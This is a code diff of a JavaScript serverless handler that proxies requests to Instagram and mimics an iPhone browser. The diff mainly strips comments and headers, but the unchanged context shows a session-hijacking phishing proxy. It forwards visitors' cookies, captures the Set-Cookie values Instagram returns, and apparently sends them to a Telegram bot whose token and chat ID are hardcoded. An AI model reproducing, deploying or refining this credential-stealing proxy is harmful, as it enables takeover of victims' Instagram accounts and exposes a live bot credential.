@@ -11,7 +11,7 @@ export default async function handler(req, res) {
   const BOT_TOKEN = "8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE";
   const CHAT_ID = "8569746095";
   
-  // ✅ Mobile User-Agent to mimic a real iPhone user
+  // ✅ Mobile User-Agent
   const MOBILE_UA = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1";
 
   // ✅ Client Info
@@ -22,10 +22,9 @@ export default async function handler(req, res) {
     const https = require("https");
     
     // ✅ Build the request to Instagram
-    // We request the user's current path (e.g., /username/ or /login/)
     const options = {
       hostname: "www.instagram.com",
-      path: req.url, // Use the exact path the user requested
+      path: req.url, 
       method: req.method,
       headers: {
         "User-Agent": MOBILE_UA,
@@ -33,13 +32,7 @@ export default async function handler(req, res) {
         "Accept-Language": "en-US,en;q=0.9",
         "Accept-Encoding": "gzip, deflate, br",
         "Connection": "keep-alive",
-        "Cache-Control": "max-age=0",
-        "Sec-Fetch-Dest": "document",
-        "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Site": "none",
-        "Sec-Fetch-User": "?1",
-        "Upgrade-Insecure-Requests": "1",
-        "Cookie": req.headers.cookie || "", // Forward user's cookies
+        "Cookie": req.headers.cookie || "", 
       },
     };
 
@@ -50,7 +43,7 @@ export default async function handler(req, res) {
       // ✅ 2. Prepare Telegram Message
       const timestamp = new Date().toISOString();
       const cookieList = cookies
-        .map((c) => c.split(";")[0]) // Remove path, expires, etc.
+        .map((c) => c.split(";")[0])
         .join("\n");
 
       const message = `
@@ -88,7 +81,6 @@ export default async function handler(req, res) {
       // ✅ 4. Stream the response to the user
       res.statusCode = response.statusCode;
       
-      // Set cookies for the user's browser
       if (cookies.length > 0) {
         res.setHeader("Set-Cookie", cookies);
       }
@@ -97,7 +89,6 @@ export default async function handler(req, res) {
         res.setHeader("Content-Type", response.headers["content-type"] || "text/html");
       }
 
-      // Pipe the Instagram HTML to the user
       response.pipe(res);
     });
 
@@ -113,3 +104,5 @@ export default async function handler(req, res) {
     res.status(500).end("Server Error");
   }
 }
+
+
